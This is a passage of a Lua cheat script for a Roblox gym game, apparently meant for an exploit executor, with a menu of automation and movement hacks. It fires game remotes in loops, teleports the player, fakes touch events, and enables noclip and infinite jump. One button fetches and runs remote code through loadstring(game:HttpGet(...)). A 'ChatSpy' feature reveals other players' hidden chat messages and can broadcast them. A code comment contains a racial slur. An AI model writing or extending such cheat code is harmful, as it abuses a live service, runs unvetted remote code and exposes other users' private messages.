                    end
                end
                
                local function EquipPunchForAllPlayers()
                    for _, player in ipairs(Players:GetPlayers()) do
                        EquipPunch(player)
                    end
                end
                
                EquipPunchForAllPlayers()
                wait(0.1) -- Adjust the wait time as needed
            end
        end)

        -- Auto Punch Toggle Action
        _G.autopunch = true
        spawn(function()
            while isToggled and _G.autopunch do
                game.Players.LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack:FindFirstChild("Punch"))
                
                local args = {
                    [1] = "punch",
                    [2] = "rightHand"
                }
                game:GetService("Players").LocalPlayer.muscleEvent:FireServer(unpack(args))

                local args = {
                    [1] = "punch",
                    [2] = "leftHand"
                }
                game:GetService("Players").LocalPlayer.muscleEvent:FireServer(unpack(args))
                
                game:GetService("RunService").RenderStepped:Wait()
            end
        end)

        -- Safe Place TP Toggle Action
        local player = game.Players.LocalPlayer
        local character = player.Character
        local targetPosition = Vector3.new(5048.7060546875, 1060.53955078125, 24828.689453125)

        teleporting = true
        spawn(function()
            while isToggled and teleporting do
                if character then
                    character.HumanoidRootPart.CFrame = CFrame.new(targetPosition)
                end
                wait(0.5) -- Adjust the wait time as needed
            end
        end)
    else
        -- Stop all actions
        isToggled = false
        getgenv().EquipPunch = false
        _G.autopunch = false
        teleporting = false
    end
end)

toggleAllFunctions:Set(false) -- Set initial state to off

folder:AddLabel("---- How to use ----")
folder:AddLabel("U need Glitchable Rebirths for muscle king and Legends Gym Rock")
folder:AddLabel("Equip Any Pet Unique pet and turn on the toggle.")
folder:AddLabel("--------------------")


-- Other stuff for Main Tab

local features = window:AddTab("Farm++")


local folder = features:AddFolder("Auto Gym++")


-- infero gym

folder:AddLabel("Inferno ISland")


folder:AddSwitch("Auto Inferno Press", function(bool)
    if bool then
        _G.autoet = true
        repeat
            -- Script generated by SimpleSpy - credits to exx#9394

            local args = {
                [1] = "useMachine",
                [2] = workspace.machinesFolder:FindFirstChild("Eternal Press").interactSeat
            }

            game:GetService("ReplicatedStorage").rEvents.machineInteractRemote:InvokeServer(unpack(args))

            local player = game.Players.LocalPlayer
            local character = player.Character
            local targetPosition = Vector3.new(-7162.3154296875, 12.490599632263184, -1088.469482421875)

            if character then
                character.HumanoidRootPart.CFrame = CFrame.new(targetPosition)
            end

            wait()

            -- Script generated by SimpleSpy - credits to exx#9394

            local args = {
                [1] = "rep",
                [2] = workspace.machinesFolder:FindFirstChild("Eternal Press").interactSeat
            }

            game:GetService("Players").LocalPlayer.muscleEvent:FireServer(unpack(args))

            game:GetService("RunService").RenderStepped:Wait()
        until not _G.autoet
    else
        _G.autoet = false
    end
end)

-- Mytical Gym

folder:AddLabel("Mythical ISland")


folder:AddSwitch("Auto Mythical Press", function(bool)
    if bool then
        _G.automy = true
        repeat
            -- Script generated by SimpleSpy - credits to exx#9394

            local args = {
                [1] = "useMachine",
                [2] = workspace.machinesFolder:FindFirstChild("Mythical Press").interactSeat
            }

            game:GetService("ReplicatedStorage").rEvents.machineInteractRemote:InvokeServer(unpack(args))

            local player = game.Players.LocalPlayer
            local character = player.Character
            local targetPosition = Vector3.new(2387.612060546875, 12.143051147460938, 1242.2725830078125)

            if character then
                character.HumanoidRootPart.CFrame = CFrame.new(targetPosition)
            end

            wait()

            -- Script generated by SimpleSpy - credits to exx#9394

            local args = {
                [1] = "rep",
                [2] = workspace.machinesFolder:FindFirstChild("Mythical Press").interactSeat
            }

            game:GetService("Players").LocalPlayer.muscleEvent:FireServer(unpack(args))

            game:GetService("RunService").RenderStepped:Wait()
        until not _G.automy
    else
        _G.automy = false
    end
end)


folder:AddSwitch("Auto Mythical Throw", function(bool)
    if bool then
        _G.automy = true
        repeat
            -- Script generated by SimpleSpy - credits to exx#9394

            local args = {
                [1] = "useMachine",
                [2] = workspace.machinesFolder:FindFirstChild("Mythical Throw").interactSeat
            }

            game:GetService("ReplicatedStorage").rEvents.machineInteractRemote:InvokeServer(unpack(args))

            local player = game.Players.LocalPlayer
            local character = player.Character
            local targetPosition = Vector3.new(2667.735107421875, 50.8892936706543, 1203.2392578125)

            if character then
                character.HumanoidRootPart.CFrame = CFrame.new(targetPosition)
            end

            wait()

            -- Script generated by SimpleSpy - credits to exx#9394

            local args = {
                [1] = "rep",
                [2] = workspace.machinesFolder:FindFirstChild("Mythical Throw").interactSeat
            }

            game:GetService("Players").LocalPlayer.muscleEvent:FireServer(unpack(args))

            game:GetService("RunService").RenderStepped:Wait()
        until not _G.automy
    else
        _G.automy = false
    end
end)


folder:AddSwitch("Auto Mythical Pullup", function(bool)
    if bool then
        _G.automy = true
        repeat
            -- Script generated by SimpleSpy - credits to exx#9394

            local args = {
                [1] = "useMachine",
                [2] = workspace.machinesFolder:FindFirstChild("Mythical Pullup").interactSeat
            }

            game:GetService("ReplicatedStorage").rEvents.machineInteractRemote:InvokeServer(unpack(args))

            local player = game.Players.LocalPlayer
            local character = player.Character
            local targetPosition = Vector3.new(2487.224365234375, 30.185104370117188, 849.0030517578125)

            if character then
                character.HumanoidRootPart.CFrame = CFrame.new(targetPosition)
            end

            wait()

            -- Script generated by SimpleSpy - credits to exx#9394

            local args = {
                [1] = "rep",
                [2] = workspace.machinesFolder:FindFirstChild("Mythical Pullup").interactSeat
            }

            game:GetService("Players").LocalPlayer.muscleEvent:FireServer(unpack(args))

            game:GetService("RunService").RenderStepped:Wait()
        until not _G.automy
    else
        _G.automy = false
    end
end)

-- frost gym

folder:AddLabel("Frost Island")


folder:AddSwitch("Auto Frost Press", function(bool)
    if bool then
        _G.autofrost = true
        repeat
            -- Script generated by SimpleSpy - credits to exx#9394

            local args = {
                [1] = "useMachine",
                [2] = workspace.machinesFolder:FindFirstChild("Frost Press").interactSeat
            }

            game:GetService("ReplicatedStorage").rEvents.machineInteractRemote:InvokeServer(unpack(args))

            local player = game.Players.LocalPlayer
            local character = player.Character
            local targetPosition = Vector3.new(-3022.441650390625, 12.486576080322266, -324.4793701171875)

            if character then
                character.HumanoidRootPart.CFrame = CFrame.new(targetPosition)
            end

            wait()

            -- Script generated by SimpleSpy - credits to exx#9394

            local args = {
                [1] = "rep",
                [2] = workspace.machinesFolder:FindFirstChild("Frost Press").interactSeat
            }

            game:GetService("Players").LocalPlayer.muscleEvent:FireServer(unpack(args))

            game:GetService("RunService").RenderStepped:Wait()
        until not _G.autofrost
    else
        _G.autofrost = false
    end
end)

folder:AddSwitch("Auto Frost Lift", function(bool)
    if bool then
        _G.autofrost = true
        repeat
            -- Script generated by SimpleSpy - credits to exx#9394

            local args = {
                [1] = "useMachine",
                [2] = workspace.machinesFolder:FindFirstChild("Frost Lift").interactSeat
            }

            game:GetService("ReplicatedStorage").rEvents.machineInteractRemote:InvokeServer(unpack(args))

            local player = game.Players.LocalPlayer
            local character = player.Character
            local targetPosition = Vector3.new(-2917.79833984375, 39.843353271484375, -209.55641174316406)

            if character then
                character.HumanoidRootPart.CFrame = CFrame.new(targetPosition)
            end

            wait()

            -- Script generated by SimpleSpy - credits to exx#9394

            local args = {
                [1] = "rep",
                [2] = workspace.machinesFolder:FindFirstChild("Frost Lift").interactSeat
            }

            game:GetService("Players").LocalPlayer.muscleEvent:FireServer(unpack(args))

            game:GetService("RunService").RenderStepped:Wait()
        until not _G.autofrost
    else
        _G.autofrost = false
    end
end)

folder:AddSwitch("Auto Frost Squat", function(bool)
    if bool then
        _G.autofrost = true
        repeat
            -- Script generated by SimpleSpy - credits to exx#9394

            local args = {
                [1] = "useMachine",
                [2] = workspace.machinesFolder:FindFirstChild("Frost Squat").interactSeat
            }

            game:GetService("ReplicatedStorage").rEvents.machineInteractRemote:InvokeServer(unpack(args))

            local player = game.Players.LocalPlayer
            local character = player.Character
            local targetPosition = Vector3.new(-2720.13232421875, 29.353620529174805, -590.1256103515625)

            if character then
                character.HumanoidRootPart.CFrame = CFrame.new(targetPosition)
            end

            wait()

            -- Script generated by SimpleSpy - credits to exx#9394

            local args = {
                [1] = "rep",
                [2] = workspace.machinesFolder:FindFirstChild("Frost Squat").interactSeat
            }

            game:GetService("Players").LocalPlayer.muscleEvent:FireServer(unpack(args))

            game:GetService("RunService").RenderStepped:Wait()
        until not _G.autofrost
    else
        _G.autofrost = false
    end
end)


-- end 


-- folder 2

local folder = features:AddFolder("Rocks")

folder:AddLabel("----Auto Rocks----")

-- Function to handle the toggle actions
local function createToggle(rockName, displayName)
    local isToggled = false -- Variable to track toggle state

    local toggle = folder:AddSwitch(displayName, function(bool)
        isToggled = bool -- Update toggle state
        if bool then
            -- Start toggled action
            while isToggled do
                firetouchinterest(game.workspace.machinesFolder[rockName].Rock, game.Players.LocalPlayer.Character.LeftHand, 0)
                wait(0.01)
                firetouchinterest(game.workspace.machinesFolder[rockName].Rock, game.Players.LocalPlayer.Character.LeftHand, 1)
            end
        end
    end)
    toggle:Set(false) -- Set initial state to off
end

-- Create toggles for each rock
createToggle("Muscle King Mountain", "Muscle King (5m)")
createToggle("Rock Of Legends", "Legends Rock (1M)")
createToggle("Inferno Rock", "Inferno Rock (750k)")
createToggle("Frozen Rock", "Frozen Rock (150k)")
folder:AddLabel("----Other Rocks----")
createToggle("Punching Rock", "Golden Rock (5k)")
createToggle("Tiny Rock", "Tiny Rock (0+)")


folder:AddLabel("-----Use Auto Punch when using auto rock-----")

local folder = features:AddFolder("Auto Rock v2")

local teleporting = false
local characterConnection

-- Function to create the switch with teleport logic
local function addTeleportSwitch(switchName, targetPosition)
    local switch = folder:AddSwitch(switchName, function(isOn)
        local player = game.Players.LocalPlayer
        teleporting = isOn

        local function teleportToSafePlace()
            while teleporting do
                local character = player.Character
                if character and character:FindFirstChild("HumanoidRootPart") then
                    character.HumanoidRootPart.CFrame = CFrame.new(targetPosition)
                end
                wait(0.01)
            end
        end

        if isOn then
            teleportToSafePlace()

            if characterConnection then
                characterConnection:Disconnect() -- Prevent multiple connections
            end

            characterConnection = player.CharacterAdded:Connect(function()
                teleportToSafePlace() -- Resume teleporting when the player respawns
            end)
        else
            teleporting = false
            if characterConnection then
                characterConnection:Disconnect()
            end
        end
    end)

    switch:Set(false)
end

-- Add all switches using the reusable function
addTeleportSwitch("Muscle King (5m)", Vector3.new(-8974.83984375, 5.459519863128662, -6127.33447265625))
addTeleportSwitch("Legends Gym (1m)", Vector3.new(4130.71728515625, 989.16259765625, -4037.680419921875))
addTeleportSwitch("Inferno Gym (750k)", Vector3.new(-7258.7841796875, 3.58951735496521, -1219.5870361328125))
addTeleportSwitch("Mhytical Gym (400k)", Vector3.new(2192.34912109375, 3.589517593383789, 1288.5355224609375))
addTeleportSwitch("Frost Gym (150k)", Vector3.new(-2559.2861328125, 4.939487934112549, -204.34103393554688))

folder:AddLabel("-----Use Auto Punch (with animation) when using auto rock v2-----")


-- folder 3


getgenv().AutoTeleport = false
getgenv().AutoRebirth = false

local teleportLocation = Vector3.new(-8625, 15, -5730)

local folder = features:AddFolder("Rebirth (Use with caution!)")


local sizeToSet = 2
local autoSetSizeEnabled = false

-- Toggle for automatic size setting
folder:AddSwitch("Auto Set size 2", function(bool)
    autoSetSizeEnabled = bool
    if bool then
        spawn(function()
            while autoSetSizeEnabled do
                game:GetService("ReplicatedStorage").rEvents.changeSpeedSizeRemote:InvokeServer("changeSize", sizeToSet)
                wait(0.2)
            end
        end)
    end
end)


local function teleportPlayer()
    local player = game.Players.LocalPlayer
    if player and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
        player.Character.HumanoidRootPart.CFrame = CFrame.new(teleportLocation)
    end
end

local function startTeleportLoop()
    while getgenv().AutoTeleport do
        teleportPlayer()
        wait(0.1)
    end
end

local autoTeleportSwitch = folder:AddSwitch("Auto Teleport King", function(bool)
    getgenv().AutoTeleport = bool
    if bool then
        spawn(startTeleportLoop)
    end
end)
autoTeleportSwitch:Set(false)

local function startRebirthLoop()
    while getgenv().AutoRebirth do
        game:GetService("ReplicatedStorage").rEvents.rebirthRemote:InvokeServer("rebirthRequest")
        wait(0.5) -- Adjust the wait time as necessary to control the rebirth frequency
    end
end

local autoRebirthSwitch = folder:AddSwitch("Auto Rebirth", function(bool)
    getgenv().AutoRebirth = bool
    if bool then
        spawn(startRebirthLoop)
    end
end)
autoRebirthSwitch:Set(false)

folder:AddLabel("-----Will add more features in rebirth soon!!-----")

-- folder 4

local folder = features:AddFolder("Auto Equip Weight Tools")

-- Function to create a toggle for auto-equipping a specific tool
local function createAutoEquipSwitch(name, toolName)
	local switch = folder:AddSwitch(name, function(bool)
		local player = game:GetService("Players").LocalPlayer
		
		local function equipTool()
			local backpack = player:FindFirstChild("Backpack")
			if backpack then
				local tool = backpack:FindFirstChild(toolName)
				if tool and not player.Character:FindFirstChild(toolName) then
					player.Character.Humanoid:EquipTool(tool)
				end
			end
		end
		
		local isActive = bool
		
		if isActive then
			equipTool()
			
			while isActive do
				local args = {
					[1] = "rep"
				}
				player.muscleEvent:FireServer(unpack(args))
				
				game:GetService("RunService").RenderStepped:Wait()
				
				-- Check and re-equip the tool if needed
				equipTool()
				
				isActive = bool -- Update the isActive status
			end
		end
		
		player.CharacterAdded:Connect(function(character)
			if bool then
				local humanoid = character:WaitForChild("Humanoid")
				equipTool()
			end
		end)
	end)

	switch:Set(false)
end

-- Create switches for each tool
createAutoEquipSwitch("Auto Weight", "Weight")
createAutoEquipSwitch("Auto Pushup", "Pushups")
createAutoEquipSwitch("Auto Handstands", "Handstands")
createAutoEquipSwitch("Auto Situps", "Situps")


folder:AddLabel("----Reset to be able to walk again----")



-- end

local features = window:AddTab("Stats") -- stats for showing shit



features:AddLabel("------------------------")

------second dropdown

local playerData = {}
local currentSelectedPlayer = nil
local dropdown = nil

local function abbreviateNumber(number)
    local suffixes = {"", "k", "M", "B", "T", "qa", "qi"}
    local index = 1
    while number >= 1000 and index < #suffixes do
        number = number / 1000
        index = index + 1
    end
    local formattedNumber = string.format("%.1f", number)
    return formattedNumber .. suffixes[index]
end

local function createPlayerLabels(player)
    local playerName = player.Name
    local labels = {
        DurabilityLabel = features:AddLabel("Durability: " .. (abbreviateNumber(player:WaitForChild("Durability").Value) or "N/A")),
        StrengthLabel = features:AddLabel("Strength: " .. (abbreviateNumber(player:WaitForChild("leaderstats"):WaitForChild("Strength").Value) or "N/A"))
    }

    playerData[playerName] = labels

    local durability = player:FindFirstChild("Durability")
    if durability then
        durability.Changed:Connect(function()
            print("Durability changed:", durability.Value)  -- Debug print
            labels.DurabilityLabel.Text = "Durability: " .. (abbreviateNumber(durability.Value) or "N/A")
        end)
    else
        print("Durability not found for player:", playerName)  -- Debug print
    end

    local leaderstats = player:FindFirstChild("leaderstats")
    if leaderstats then
        local strength = leaderstats:FindFirstChild("Strength")
        if strength then
            strength.Changed:Connect(function()
                print("Strength changed:", strength.Value)  -- Debug print
                labels.StrengthLabel.Text = "Strength: " .. (abbreviateNumber(strength.Value) or "N/A")
            end)
        else
            print("Strength not found for player:", playerName)  -- Debug print
        end
    else
        print("leaderstats not found for player:", playerName)  -- Debug print
    end
end

local function removePlayerLabels(playerName)
    local labels = playerData[playerName]
    if labels then
        labels.DurabilityLabel:Remove()
        labels.StrengthLabel:Remove()
        playerData[playerName] = nil
    end
end

local function recreateDropdown()
    if dropdown then
        dropdown:Remove()
    end
    
    dropdown = features:AddDropdown("Players", function(playerName)
        local player = game.Players:FindFirstChild(playerName)
        if player then
            if currentSelectedPlayer then
                removePlayerLabels(currentSelectedPlayer)
            end
            createPlayerLabels(player)
            currentSelectedPlayer = playerName
        end
    end)
    
    for _, player in ipairs(game.Players:GetPlayers()) do
        dropdown:Add(player.Name)
    end
end

recreateDropdown()

game.Players.PlayerAdded:Connect(function(player)
    dropdown:Add(player.Name) -- Add new player to dropdown when they join
end)

game.Players.PlayerRemoving:Connect(function(player)
    removePlayerLabels(player.Name)
    recreateDropdown()
end)

-- Ensure existing players are set up initially
for _, player in ipairs(game.Players:GetPlayers()) do
    if player == currentSelectedPlayer then
        createPlayerLabels(player)
    end
end

features:AddLabel("0. Is not accurate sometimes lol")




-- Barrier nigga

features:AddLabel("------------------------")

--See kills Gui show

local function createAndShowGUI()
    local screenGui = Instance.new("ScreenGui")
    screenGui.ResetOnSpawn = false

    local frame = Instance.new("Frame", screenGui)
    frame.Size = UDim2.new(0.15, 0, 0.1, 0)
    frame.Position = UDim2.new(0.25, 0, 0.25, 0)
    frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)

    local textLabel = Instance.new("TextLabel", frame)
    textLabel.Size = UDim2.new(1, 0, 1, 0)
    textLabel.Position = UDim2.new(0, 0, 0, 0)
    textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    textLabel.TextScaled = true

    local function UpdateLabelText()
        textLabel.Text = "Kills: " .. game.Players.LocalPlayer.leaderstats.Kills.Value
    end

    screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")

    UpdateLabelText()

    game.Players.LocalPlayer.leaderstats.Kills:GetPropertyChangedSignal("Value"):Connect(function()
        UpdateLabelText()
    end)

    -- Draggable GUI for PC and Mobile
    local dragging
    local dragInput
    local dragStart
    local startPos

    local function updateInput(input)
        local delta = input.Position - dragStart
        frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end

    frame.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            dragStart = input.Position
            startPos = frame.Position

            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then
                    dragging = false
                end
            end)
        end
    end)

    frame.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
            dragInput = input
        end
    end)

    game:GetService("UserInputService").InputChanged:Connect(function(input)
        if dragging and input == dragInput then
            updateInput(input)
        end
    end)
end

features:AddButton("Show Kills GUI", function()
    createAndShowGUI()
end)


-- End

-- stats track


local playerData = {}

local function abbreviateNumber(number)
    local suffixes = {"", "k", "M", "B", "T", "qa", "qi"}
    local index = 1
    while number >= 1000 and index < #suffixes do
        number = number / 1000
        index = index + 1
    end
    local formattedNumber = string.format("%.1f", number)
    return formattedNumber .. suffixes[index]
end

local function createPlayerLabels(player)
    local playerName = player.Name
    local initialDurability = player:WaitForChild("Durability").Value
    local initialStrength = player:WaitForChild("leaderstats"):WaitForChild("Strength").Value
    local initialKills = player:WaitForChild("leaderstats"):WaitForChild("Kills").Value

    local labels = {
        DurabilityGainLabel = features:AddLabel("Durability Gain: " .. "0"),
        StrengthGainLabel = features:AddLabel("Strength Gain: " .. "0"),
        KillsGainLabel = features:AddLabel("Kills Gain: " .. "0")
    }

    playerData[playerName] = {
        Labels = labels,
        InitialDurability = initialDurability,
        InitialStrength = initialStrength,
        InitialKills = initialKills
    }

    local durability = player:FindFirstChild("Durability")
    if durability then
        durability.Changed:Connect(function()
            local gain = durability.Value - playerData[playerName].InitialDurability
            labels.DurabilityGainLabel.Text = "Durability Gain: " .. abbreviateNumber(gain)
        end)
    else
        print("Durability not found for player:", playerName)  -- Debug print
    end

    local leaderstats = player:FindFirstChild("leaderstats")
    if leaderstats then
        local strength = leaderstats:FindFirstChild("Strength")
        if strength then
            strength.Changed:Connect(function()
                local gain = strength.Value - playerData[playerName].InitialStrength
                labels.StrengthGainLabel.Text = "Strength Gain: " .. abbreviateNumber(gain)
            end)
        else
            print("Strength not found for player:", playerName)  -- Debug print
        end
        local kills = leaderstats:FindFirstChild("Kills")
        if kills then
            kills.Changed:Connect(function()
                local gain = kills.Value - playerData[playerName].InitialKills
                labels.KillsGainLabel.Text = "Kills Gain: " .. abbreviateNumber(gain)
            end)
        else
            print("Kills not found for player:", playerName)  -- Debug print
        end
    else
        print("leaderstats not found for player:", playerName)  -- Debug print
    end
end

-- Add labels for the current player
local function initializeCurrentPlayer()
    local player = game.Players.LocalPlayer
    if player then
        createPlayerLabels(player)
    else
        print("Local player not found")
    end
end

initializeCurrentPlayer()

game.Players.PlayerRemoving:Connect(function(player)
    local playerName = player.Name
    local data = playerData[playerName]
    if data then
        for _, label in pairs(data.Labels) do
            label:Remove()
        end
        playerData[playerName] = nil
    end
end)

game.Players.PlayerAdded:Connect(function(player)
    if player == game.Players.LocalPlayer then
        initializeCurrentPlayer()
    end
end)




features:AddLabel("------------------------")


-- another tab lmfao


local features = window:AddTab("Players") -- players tab

local function setWalkSpeed(speed)
    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = speed
end

features:AddTextBox("WalkSpeed", function(text)
    local speed = tonumber(text)
    if speed then
        setWalkSpeed(speed)
    end
end)

local function setJumpPower(power)
    game.Players.LocalPlayer.Character.Humanoid.JumpPower = power
end

features:AddTextBox("JumpPower", function(text)
    local power = tonumber(text)
    if power then
        setJumpPower(power)
    end
end)

local function setHipHeight(height)
    game.Players.LocalPlayer.Character.Humanoid.HipHeight = height
end

features:AddTextBox("HipHeight", function(text)
    local height = tonumber(text)
    if height then
        setHipHeight(height)
    end
end)

-- Function to limit the camera zoom distance
local function limitCameraZoom(maxZoomDistance)
    if game:GetService("Players").LocalPlayer then
        game:GetService("Players").LocalPlayer.CameraMaxZoomDistance = maxZoomDistance
    end
end

-- Add a text box for specifying the max zoom distance
features:AddTextBox("Max Zoom Distance", function(text)
    local maxZoomDistance = tonumber(text)
    if maxZoomDistance then
        limitCameraZoom(maxZoomDistance)
    else
        warn("Invalid input. Please enter a valid number for the max zoom distance.")
    end
end)

-- Initial zoom distance
local DEFAULT_ZOOM_DISTANCE = 100 -- Default zoom distance if no value is specified
limitCameraZoom(DEFAULT_ZOOM_DISTANCE) -- Set the initial zoom distance





local sizeToSet = 2
local autoSetSizeEnabled = false

local textBox = features:AddTextBox("Size", function(text)
    local newSize = tonumber(text)
    if newSize and newSize >= 1 and newSize <= 100 then
        sizeToSet = newSize
        if autoSetSizeEnabled then
            game:GetService("ReplicatedStorage").rEvents.changeSpeedSizeRemote:InvokeServer("changeSize", sizeToSet)
        end
    else
        sizeToSet = 2
    end
end)

-- Toggle für die automatische Größenänderung
local switch = features:AddSwitch("Set Size", function(bool)
    autoSetSizeEnabled = bool
    if bool then
        game:GetService("ReplicatedStorage").rEvents.changeSpeedSizeRemote:InvokeServer("changeSize", sizeToSet)
    end
end)

local function autoSetSize()
    while autoSetSizeEnabled do
        game:GetService("ReplicatedStorage").rEvents.changeSpeedSizeRemote:InvokeServer("changeSize", sizeToSet)
        wait(1)
    end
end

spawn(autoSetSize)

features:AddLabel("-------------")

local switch = features:AddSwitch("Lock Client Position", function(bool)
    function freezePlayer()
        local player = game.Players.LocalPlayer
        local character = player.Character or player.CharacterAdded:Wait()
        local rootPart = character:WaitForChild("HumanoidRootPart")
    
        local fixedPosition = rootPart.Position
    
        local runService = game:GetService("RunService")
        player:SetAttribute("Frozen", true)
    
        local bodyPosition = Instance.new("BodyPosition")
        bodyPosition.Position = fixedPosition
        bodyPosition.MaxForce = Vector3.new(1e6, 1e6, 1e6)
        bodyPosition.P = 1e4
        bodyPosition.D = 1e3
    
        local bodyGyro = Instance.new("BodyGyro")
        bodyGyro.CFrame = rootPart.CFrame
        bodyGyro.MaxTorque = Vector3.new(1e6, 1e6, 1e6)
        bodyGyro.P = 1e4
    
        bodyPosition.Parent = rootPart
        bodyGyro.Parent = rootPart
    
        local connection
        connection = runService.Stepped:Connect(function()
            if player:GetAttribute("Frozen") then
                rootPart.Velocity = Vector3.new(0, 0, 0)
                rootPart.RotVelocity = Vector3.new(0, 0, 0)
                rootPart.CFrame = CFrame.new(fixedPosition)
                bodyPosition.Position = fixedPosition
                bodyGyro.CFrame = rootPart.CFrame
            else
                connection:Disconnect()
                bodyPosition:Destroy()
                bodyGyro:Destroy()
            end
        end)
    end
    
    function unfreezePlayer()
        local player = game.Players.LocalPlayer
        player:SetAttribute("Frozen", false)
    end
    
    if bool then
        freezePlayer()
    else
        unfreezePlayer()
    end
end)

features:AddButton("Remove Punch Animation",function()
	game:GetService("Players").LocalPlayer.Backpack.Punch.RequiresHandle = true
end)

features:AddButton("Recover Punch Animation",function()
	game:GetService("Players").LocalPlayer.Backpack.Punch.RequiresHandle = false
end)

-- Inf jump stuff 

-- Define the InfiniteJumpEnabled variable
local InfiniteJumpEnabled = false

-- Connect the JumpRequest event
game:GetService("UserInputService").JumpRequest:connect(function()
    if InfiniteJumpEnabled then
        -- Change the state of the player's humanoid to "Jumping"
        game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):ChangeState("Jumping")
    end
end)

-- Create the switch and define its functionality
local switch = features:AddSwitch("Infinite Jump", function(bool)
    InfiniteJumpEnabled = bool -- Update the InfiniteJumpEnabled variable based on the switch state
end)

-- Set the default state of the switch to false
switch:Set(false)


-- Define the necessary variables
local NoclipEnabled = false
local NoclipConnection = nil

-- Define the noclip function
local function noclip()
    NoclipEnabled = true
    local function Nocl()
        if NoclipEnabled and game.Players.LocalPlayer.Character then
            for _,v in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
                if v:IsA('BasePart') and v.CanCollide then
                    v.CanCollide = false
                end
            end
        end
    end
    NoclipConnection = game:GetService('RunService').Stepped:Connect(Nocl)
end

-- Define the clip function
local function clip()
    NoclipEnabled = false
    if NoclipConnection then
        NoclipConnection:Disconnect()
    end
end

-- Create the switch for toggling noclip
local switch = features:AddSwitch("Noclip", function(bool)
    if bool then
        noclip()
    else
        clip()
    end
end)

-- Set the default state of the switch
switch:Set(false) -- Noclip disabled by default



features:AddButton("Anti Afk", function(Value)
    loadstring(game:HttpGet("https://raw.githubusercontent.com/juywvm/-Roblox-Projects-/main/____Anti_Afk_Remastered_______"))();
end)

features:AddButton("ChatSpy", function()
    --This script reveals ALL hidden messages in the default chat

enabled = true --chat "/spy" to toggle!
spyOnMyself = true --if true will check your messages too
public = false --if true will chat the logs publicly (fun, risky)
publicItalics = true --if true will use /me to stand out
privateProperties = { --customize private logs
   Color = Color3.fromRGB(0,255,255); 
   Font = Enum.Font.SourceSansBold;
   TextSize = 18;
}


local StarterGui = game:GetService("StarterGui")
local Players = game:GetService("Players")
local player = Players.LocalPlayer or Players:GetPropertyChangedSignal("LocalPlayer"):Wait() or Players.LocalPlayer
local saymsg = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest")
local getmsg = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("OnMessageDoneFiltering")
local instance = (_G.chatSpyInstance or 0) + 1
_G.chatSpyInstance = instance

local function onChatted(p,msg)
   if _G.chatSpyInstance == instance then
       if p==player and msg:lower():sub(1,4)=="/spy" then
           enabled = not enabled
           wait(0.3)
           privateProperties.Text = "{SPY "..(enabled and "EN" or "DIS").."ABLED}"
           StarterGui:SetCore("ChatMakeSystemMessage",privateProperties)
       elseif enabled and (spyOnMyself==true or p~=player) then
           msg = msg:gsub("[\n\r]",''):gsub("\t",' '):gsub("[ ]+",' ')
           local hidden = true
           local conn = getmsg.OnClientEvent:Connect(function(packet,channel)
               if packet.SpeakerUserId==p.UserId and packet.Message==msg:sub(#msg-#packet.Message+1) and (channel=="All" or (channel=="Team" and public==false and Players[packet.FromSpeaker].Team==player.Team)) then
                   hidden = false
               end
           end)
           wait(1)
           conn:Disconnect()
           if hidden and enabled then
               if public then
                   saymsg:FireServer((publicItalics and "/me " or '').."{SPY} [".. p.Name .."]: "..msg,"All")
               else
                   privateProperties.Text = "{SPY} [".. p.Name .."]: "..msg
                   StarterGui:SetCore("ChatMakeSystemMessage",privateProperties)
               end
           end
       end
   end
end

for _,p in ipairs(Players:GetPlayers()) do
   p.Chatted:Connect(function(msg) onChatted(p,msg) end)
end
Players.PlayerAdded:Connect(function(p)
   p.Chatted:Connect(function(msg) onChatted(p,msg) end)
end)
privateProperties.Text = "{SPY "..(enabled and "EN" or "DIS").."ABLED}"
StarterGui:SetCore("ChatMakeSystemMessage",privateProperties)
if not player.PlayerGui:FindFirstChild("Chat") then wait(3) end
local chatFrame = player.PlayerGui.Chat.Frame
chatFrame.ChatChannelParentFrame.Visible = true
chatFrame.ChatBarParentFrame.Position = chatFrame.ChatChannelParentFrame.Position+UDim2.new(UDim.new(),chatFrame.ChatChannelParentFrame.Size.Y)
end)


features:AddButton("Fps Boost", function()
    local function GetReduce(v)
        if v:IsA("Part") then
            v.Material = Enum.Material.Plastic
        elseif v.ClassName:match("Light") then
            v:Destroy()
        elseif v.ClassName:match("Effect") then
            pcall(function()
                v.Enabled = false
            end)
        end
    end
    local Lighting = game:GetService("Lighting")
    for i, v in ipairs(Lighting:GetChildren()) do
        GetReduce(v)
    end
    Lighting.DescendantAdded:Connect(GetReduce)
    local workspace = game:GetService("Workspace")
    for i, v in ipairs(workspace:GetDescendants()) do
        GetReduce(v)
    end
    workspace.DescendantAdded:Connect(GetReduce)
end)
--// More to Stats Tab if needed \\--

local features = window:AddTab("Killing") -- Name of tab

local switch = features:AddSwitch("Auto Equip Punch", function(v)
    local Players = game:GetService("Players")

    local function OnTouched(hit)
        local humanoid = hit.Parent:FindFirstChildOfClass("Humanoid")
        if humanoid then
            humanoid:TakeDamage(10) -- Change the damage value as needed
        end
    end

    local function EquipPunch(player)
        local punchTool = player.Backpack:FindFirstChild("Punch")
        if punchTool and punchTool:IsA("Tool") then
            if not player.Character:FindFirstChild("Punch") then
                punchTool.Parent = player.Character
            end
        end
    end

    local function EquipPunchForAllPlayers()
        for _, player in ipairs(Players:GetPlayers()) do
            EquipPunch(player)
        end
    end

    loopEquipPunch = function()
        while true do
            if getgenv().EquipPunch then
                EquipPunchForAllPlayers()
            else
                break -- Break the loop if EquipPunch is false
            end
            wait(0,1) -- Adjust the wait time as needed
        end
    end

    getgenv().EquipPunch = v

    if v then
